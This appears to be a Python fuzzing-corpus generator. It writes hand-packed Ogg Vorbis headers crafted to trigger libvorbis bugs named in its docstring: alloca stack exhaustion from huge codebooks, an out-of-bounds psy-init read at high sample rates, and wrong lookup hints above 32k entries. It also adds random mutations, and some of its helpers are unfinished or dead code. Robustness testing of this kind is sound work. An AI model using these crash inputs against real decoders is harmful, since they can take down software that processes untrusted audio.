#!/usr/bin/env python3
"""Bitpacker for Vorbis headers + d7vi corpus generator.

Builds syntactically-precise setup headers so the decoder walks the exact
code paths the 1.3.7..main diff flagged:
  T1  vorbis_book_init_decode alloca(sizeof(ptr)*used_entries)+alloca(n*4)
      (upstream 28965ede) — used_entries is attacker-controlled with only the
      dim*entries<=2^24 bound, so dim=1, entries=2^21..2^23 passes the check
      and stacks 12-32 MB of alloca per call.
  T2  _vp_psy_init halfoc interpolation reads P_BANDS at the clamp
      (upstream 315da9cc) — needs high rate; include the floor1 setup that
      survives init to reach psy init.
  T3  >32k-entry codebooks make the 15-bit firsttable hints wrong
      (upstream e3c9861f) — decode-time binary search on wrong lo/hi.

Ogg pages get correct CRCs so the framing layer accepts them.
"""
import struct, sys, os, random

OUT = sys.argv[1] if len(sys.argv) > 1 else "corpus"
os.makedirs(OUT, exist_ok=True)

# ---------- ogg framing ----------
def ogg_crc(data):
    tbl = []
    for i in range(256):
        c = i << 24
        for _ in range(8):
            c = ((c << 1) ^ 0x04c11db7) & 0xffffffff if c & 0x80000000 else (c << 1) & 0xffffffff
        tbl.append(c)
    crc = 0
    for b in data:
        crc = ((crc << 8) & 0xffffffff) ^ tbl[((crc >> 24) & 0xff) ^ b]
    return crc

def page(packets, serial, pno, bos=False, eos=False, granule=0):
    segs = []
    for p in packets:
        n = len(p)
        while n > 255:
            segs.append(255); n -= 255
        segs.append(n)
    head = (b"OggS" + bytes([0, (2 if bos else 0) | (4 if eos else 0)]) +
            struct.pack("<q", granule) + struct.pack("<i", serial) +
            struct.pack("<I", pno & 0xffffffff) + b"\x00\x00\x00\x00" +
            bytes([len(segs)]))
    head += bytes(segs)
    body = b"".join(packets)
    raw = head + body
    crc = ogg_crc(raw)
    return raw[:22] + struct.pack("<I", crc) + raw[26:]

# ---------- bitpacker (LSB-first, Vorbis style) ----------
class BP:
    def __init__(self):
        self.bits = []
    def w(self, val, n):
        for i in range(n):
            self.bits.append((val >> i) & 1)
    def bytes(self):
        out = bytearray((len(self.bits) + 7) // 8)
        for i, b in enumerate(self.bits):
            if b:
                out[i // 8] |= 1 << (i % 8)
        return bytes(out)

def ilog(x):
    n = 0
    while x:
        n += 1; x >>= 1
    return n

# ---------- headers ----------
def ident(channels=2, rate=44100, bmax=2048, bmin=256):
    bp = BP()
    bp.w(1, 8)  # packet type
    for c in b"vorbis":
        bp.w(c, 8)
    bp.w(0, 32)  # version
    bp.w(channels, 8)
    bp.w(rate, 32)
    bp.w(bmax, 32)   # bitrate upper
    bp.w(128000, 32) # bitrate nominal
    bp.w(bmin, 32)   # bitrate lower
    bs = ilog(bmax) - 1
    bp.w(bs, 4); bp.w(bs, 4); bp.w(1, 1)
    return b"\x01vorbis" + bp.bytes()[6:] if False else bp.bytes()

def comment():
    bp = BP()
    bp.w(3, 8)
    for c in b"vorbis":
        bp.w(c, 8)
    bp.w(2, 32); bp.w(ord('f'), 8); bp.w(ord('u'), 8)
    bp.w(0, 32)
    bp.w(1, 8)  # framing bit
    return bp.bytes()

def codebook_bp(dim, entries, lengths, maptype=0):
    """lengths: list of length per entry (0 = unused) for unordered form."""
    bp = BP()
    bp.w(0x564342, 24)
    bp.w(dim, 16)
    bp.w(entries, 24)
    # unordered (flag 0)
    bp.w(0, 1)
    for L in lengths:
        bp.w(0 if L == 0 else 1, 1)  # unused tag: with unused=0 we don't tag;
    # NOTE: with flag 0 above (unused=0), all entries used, lengths 5-bit each
    return bp

def codebook_unordered(dim, entries, lengths, maptype=0):
    bp = BP()
    bp.w(0x564342, 24)
    bp.w(dim, 16)
    bp.w(entries, 24)
    bp.w(0, 1)          # unordered
    bp.w(0, 1)          # sparse flag: 0 = all entries used
    for L in lengths:
        bp.w(L - 1, 5)  # stored as num = length-1
    bp.w(maptype, 4)
    return bp

def codebook_ordered(dim, entries, first_len, runs, maptype=0):
    """ordered: flag 1; runs = [(count, ...)]: each run length+1. We emit
    counts so total = entries."""
    bp = BP()
    bp.w(0x564342, 24)
    bp.w(dim, 16)
    bp.w(entries, 24)
    bp.w(1, 1)              # ordered
    bp.w(first_len - 1, 5)  # first length (5 bits, +1)
    length = first_len
    i = 0
    for num in runs:
        if i >= entries:
            break
        num = min(num, entries - i)
        bp.w(num, ilog(entries - i))
        i += num
        length += 1
    bp.w(maptype, 4)
    return bp

def valid_tail(bp):
    """floor1 + residue0 + mapping0 + 1 mode, matching the working valid_setup."""
    # times: 1x type 0
    bp.w(0, 6); bp.w(0, 16)
    # floors: 1x floor1
    bp.w(0, 6); bp.w(1, 16)
    bp.w(1, 5)          # partitions=1
    bp.w(0, 4)          # partitionclass[0]=0
    bp.w(1, 3)          # class_dim-1 -> 2
    bp.w(0, 2)          # class_subs=0
    bp.w(0, 8)          # class_subbook[0]: read(8)-1 = -1 (none)
    bp.w(0, 2)          # mult-1
    bp.w(11, 4)         # rangebits
    bp.w(1, 11)         # post0
    bp.w(2047, 11)      # post1
    # residues: 1x type 0
    bp.w(0, 6); bp.w(0, 16)
    bp.w(0, 24)         # begin
    bp.w(2047, 24)      # end
    bp.w(7, 24)         # grouping-1
    bp.w(0, 6)          # partitions-1
    bp.w(0, 8)          # groupbook = book0
    bp.w(1, 3); bp.w(0, 1)  # cascade
    bp.w(0, 8)          # booklist[0] = book0 (maptype0 -> res0 errout!)
    # residues need a maptype!=0 book; caller must provide book1 maptype1
    # NOTE: this tail assumes exactly the valid_setup book layout when used
    # standalone. For arbitrary book lists pass extra bits instead.
    bp.w(0, 8)          # (placeholder overwritten by callers who care)
    # maps: 1x type 0
    bp.w(0, 6); bp.w(0, 16)
    bp.w(0, 1)          # submaps=1
    bp.w(0, 1)          # coupling=0
    bp.w(0, 2)          # reserved
    bp.w(0, 8)          # time config
    bp.w(0, 8)          # floor submap
    bp.w(0, 8)          # residue submap
    # modes: 1
    bp.w(0, 6)
    bp.w(0, 1)          # blockflag
    bp.w(0, 16)         # windowtype
    bp.w(0, 16)         # transformtype
    bp.w(0, 8)          # mapping
    bp.w(1, 1)          # EOP


def bigbook_setup(bigbook):
    """Setup with [bigbook, maptype1(2 entries), maptype1(2 entries)] and a
    valid tail whose residue references books 1/2."""
    books = [bigbook]
    def cb_map1(dim, entries, lengths, qquant=4):
        b = codebook_unordered(dim, entries, lengths, maptype=1)
        b.w(0, 32); b.w(1, 32); b.w(qquant - 1, 4); b.w(0, 1)
        for _ in range(entries * dim):
            b.w(0, qquant)
        return b
    books.append(cb_map1(1, 2, [1, 1]))
    books.append(cb_map1(1, 2, [1, 1]))
    bp = BP()
    bp.w(5, 8)
    for c in b"vorbis":
        bp.w(c, 8)
    bp.w(len(books) - 1, 8)
    for cb in books:
        for b in cb.bits:
            bp.bits.append(b)
    valid_tail_for(bp, groupbook=1, valbook=2)
    return bp.bytes()


def valid_tail_for(bp, groupbook=0, valbook=0):
    bp.w(0, 6); bp.w(0, 16)               # times
    bp.w(0, 6); bp.w(1, 16)               # floors: 1x floor1
    bp.w(1, 5); bp.w(0, 4); bp.w(1, 3)    # partitions/pclass/dim-1
    bp.w(0, 2); bp.w(0, 8)                # csubs; subbook none
    bp.w(0, 2); bp.w(11, 4)               # mult-1; rangebits
    bp.w(1, 11); bp.w(2047, 11)           # posts
    bp.w(0, 6); bp.w(0, 16)               # residues: 1x type0
    bp.w(0, 24); bp.w(2047, 24)           # begin/end
    bp.w(7, 24); bp.w(0, 6)               # grouping-1; partitions-1
    bp.w(groupbook, 8)                    # groupbook
    bp.w(1, 3); bp.w(0, 1)                # cascade
    bp.w(valbook, 8)                      # booklist[0]
    bp.w(0, 6); bp.w(0, 16)               # maps: 1x type0
    bp.w(0, 1); bp.w(0, 1); bp.w(0, 2)    # submaps/coupling/reserved
    bp.w(0, 8); bp.w(0, 8); bp.w(0, 8)    # time/floor/res submaps
    bp.w(0, 6)                            # modes-1
    bp.w(0, 1); bp.w(0, 16); bp.w(0, 16); bp.w(0, 8)
    bp.w(1, 1)                            # EOP


def setup_header(codebooks, extra=None):
    bp = BP()
    bp.w(5, 8)
    for c in b"vorbis":
        bp.w(c, 8)
    bp.w(len(codebooks) - 1, 8)  # stored as count-1
    for cb in codebooks:
        for b in cb.bits:
            bp.bits.append(b)
    if extra:
        for b in extra.bits:
            bp.bits.append(b)
    else:
        valid_tail(bp)
    return bp.bytes()

def stream(name, ident_p, setup_p, audio_pkts=2, serial=0x1234):
    parts = [page([ident_p], serial, 0, bos=True),
             page([comment()], serial, 1),
             page([setup_p], serial, 2)]
    for i in range(audio_pkts):
        parts.append(page([bytes([i]) * 100], serial, 3 + i, eos=(i == audio_pkts - 1)))
    data = b"".join(parts)
    with open(os.path.join(OUT, name + ".ogg"), "wb") as f:
        f.write(data)
    return name

cases = []

# ---------- sane seed ----------
add = lambda n, *a, **k: cases.append(stream(n, *a, **k))
add("seed_sane", ident(), setup_header([]))

# ---------- T1: alloca storm, dim=1, huge entries ----------
# bound: ilog(dim)+ilog(entries) <= 24 -> dim=1 (ilog=0? ov_ilog(1)=1) so
# entries up to 2^23. All entries used, ordered form with all counts=1 length
# increments is invalid (overfull tree check num-1>>(length-1)>1 -> num<=2^len)
# so make lengths grow: run of 2^len entries at each length.
def t1(entries):
    runs = []
    remaining = entries
    length = 1
    while remaining > 0:
        cap = 1 << length  # num <= 2^length (per overfull check num-1>>(length-1)<=1)
        take = min(cap, remaining)
        runs.append(take)
        remaining -= take
        length += 1
    return codebook_ordered(1, entries, 1, runs)

# NOTE: 1 codebook in setup_header; codebooks are only initialized in
# synthesis_init AFTER all three headers parse, and init walks ALL books.
for exp in (18, 19, 20, 22):  # 2^23 fails the ilog(dim)+ilog(entries)<=24 bound with dim=1
    entries = 1 << exp
    cb = t1(entries)
    add(f"t1_alloca_e2{exp}", ident(), bigbook_setup(cb))

# T1b dim=0: ov_ilog(0)=0 so ilog-sum=ilog(entries) only
cb = t1(1 << 22)
# patch dim to 0 by rebuilding with dim=0
bp0 = codebook_ordered(0, 1 << 22, 1, [])
add("t1_alloca_dim0", ident(), bigbook_setup(bp0))

# ---------- T2: high rates to push halfoc to the P_BANDS clamp ----------
for rate in (96000, 192000, 384000):
    pass  # t2 cases registered after valid_setup below

# ---------- T3: >32k used entries for the 15-bit hint wrap ----------
def t3(entries, dim=1):
    runs = []
    remaining = entries
    length = 1
    while remaining > 0:
        cap = 1 << length
        take = min(cap, remaining)
        runs.append(take)
        remaining -= take
        length += 1
    return codebook_ordered(dim, entries, 1, runs)

for entries in (32769, 65536, 100000):
    cb = t3(entries)
    add(f"t3_hints_{entries}", ident(), bigbook_setup(cb))

# ---------- grammar: truncations, absurd values ----------
add("g_ch8", ident(channels=8), setup_header([]))
add("g_ch255", ident(channels=255), setup_header([]))
for bsz in (8192, 16384):
    add(f"g_bsz_{bsz}", ident(bmax=bsz, bmin=bsz), setup_header([]))
add("g_rate_1", ident(rate=1), setup_header([]))
add("g_rate_max", ident(rate=0xFFFFFFFF), setup_header([]))

# empty lengths codebook (all length-1 = 0 -> invalid but parse-heavy)
bp = codebook_unordered(1, 8, [0] * 8)
add("g_allzero_lens", ident(), setup_header([bp]))

# single-entry codebook (special fastpath)
add("g_single", ident(), setup_header([codebook_ordered(1, 1, 1, [1])]))

# random mutations of the seed's setup header
rng = random.Random(1337)
base_setup = setup_header([t1(1 << 10)])
base = (page([ident()], 0x9999, 0, bos=True) + page([comment()], 0x9999, 1) +
        page([base_setup], 0x9999, 2))
for i in range(60):
    b = bytearray(base)
    for _ in range(rng.randint(1, 8)):
        pos = rng.randrange(len(b))
        b[pos] = rng.randrange(256)
    name = f"m_{i}"
    with open(os.path.join(OUT, name + ".ogg"), "wb") as f:
        f.write(bytes(b))
    cases.append(name)

print(f"{len(cases)} cases -> {OUT}/")

# ---------- valid minimal setup header (floor1+res0+map0+1 mode) ----------

def valid_setup():

    """A setup header that actually passes _vorbis_unpack_books so decode runs.
    Books: [0] floor1 class book (maptype 1 needed for residue books; keep
    book0 maptype 0 for floor class), [1] residue groupbook (maptype 1),
    [2] residue value book (maptype 1)."""
    books = []
    # book0: small unordered, 4 entries dim 1, lengths 2,2,2,2 maptype 0
    books.append(codebook_unordered(1, 4, [2, 2, 2, 2], maptype=0))
    # book1: groupbook, needs maptype != 0: 2 entries dim 1 lengths 1,1 maptype1
    def codebook_map1(dim, entries, lengths, qmin=0, qdelta=1, qquant=4):
        bp = codebook_unordered(dim, entries, lengths, maptype=1)
        bp.w(qmin, 32); bp.w(qdelta, 32); bp.w(qquant - 1, 4); bp.w(0, 1)
        if entries * dim > 0:
            # quantlist: qquant bits each, entries*dim values
            for _ in range(entries * dim):
                bp.w(0, qquant)
        return bp
    books.append(codebook_map1(1, 2, [1, 1]))
    books.append(codebook_map1(1, 2, [1, 1]))
    bp = BP()
    bp.w(5, 8)
    for c in b"vorbis":
        bp.w(c, 8)
    bp.w(len(books) - 1, 8)
    for cb in books:
        for b in cb.bits:
            bp.bits.append(b)
    # times: 1x type 0
    bp.w(0, 6); bp.w(0, 16)
    # floors: 1x floor1
    bp.w(0, 6); bp.w(1, 16)
    bp.w(1, 5)          # partitions=1 (stored as-is? spec: partitions = value)
    bp.w(0, 4)          # partitionclass[0] = 0
    bp.w(1, 3)          # class_dim = 2 (value+1)
    bp.w(0, 2)          # class_subs = 0
    bp.w(0, 8)          # class_subbook[0]: stored+1-1... read(8)-1=-1 => none
    bp.w(0, 2)          # mult = 1 (value+1)
    bp.w(11, 4)         # rangebits = 11 (2048)
    bp.w(1, 11)         # post x0 (must differ from implicit 0)
    bp.w(2047, 11)      # post x1
    # residues: 1x type 0
    bp.w(0, 6); bp.w(0, 16)
    bp.w(0, 24)         # begin
    bp.w(2047, 24)      # end
    bp.w(7, 24)         # grouping-1 -> 8
    bp.w(0, 6)          # partitions-1 -> 1
    bp.w(0, 8)          # groupbook = book1
    bp.w(1, 3); bp.w(0, 1)  # cascade: 1 secondstage bit, no cflag
    bp.w(2, 8)          # booklist[0] = book2
    # maps: 1x type 0
    bp.w(0, 6); bp.w(0, 16)
    bp.w(0, 1)          # submaps=1
    bp.w(0, 1)          # coupling=0
    bp.w(0, 2)          # reserved
    bp.w(0, 8)          # time config
    bp.w(0, 8)          # floor submap
    bp.w(0, 8)          # residue submap
    # modes: 1
    bp.w(0, 6)
    bp.w(0, 1)          # blockflag
    bp.w(0, 16)         # windowtype
    bp.w(0, 16)         # transformtype
    bp.w(0, 8)          # mapping 0
    bp.w(1, 1)          # EOP
    return bp.bytes()

# regenerate seed with the valid setup
add("seed_valid", ident(), valid_setup(), audio_pkts=4)
add("seed_sane_valid", ident(), valid_setup())
for _rate in (96000, 192000, 384000):
    add(f"t2_rate_{_rate}", ident(rate=_rate), valid_setup())
add("g_bogus_setup", ident(), setup_header([]))

with open(os.path.join(OUT, "index.txt"), "w") as f:
    f.write("\n".join(cases) + "\n")
